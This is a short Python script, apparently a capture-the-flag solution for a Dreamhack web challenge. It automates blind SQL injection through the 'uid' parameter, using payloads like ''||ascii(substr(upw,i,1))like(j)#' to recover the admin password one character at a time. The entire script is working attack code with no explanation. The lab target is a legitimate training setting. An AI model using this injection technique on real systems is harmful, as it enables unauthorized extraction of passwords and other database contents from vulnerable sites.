import requests
url="http://host3.dreamhack.games:15915/"
# #길이구하기부분
# # n=0
# # while True:
# #     n+=1
# #     print(n)
# #     params={"uid":f"'||length(upw)like({n})#"}
# #     res=requests.get(url,params)
# #     if "admin"in res.text:
# #         break
# # print("length:",n)
length=44
pw=""
for i in range(1,length+1):
    print("text:",i)
    for j in range(0,127):
        params={"uid":f"'||ascii(substr(upw,{i},1))like({j})#"}
        res=requests.get(url,params)
        if "admin" in res.text:
            pw+=chr(j)
            print(pw)
            break
print("FLAG:",pw)
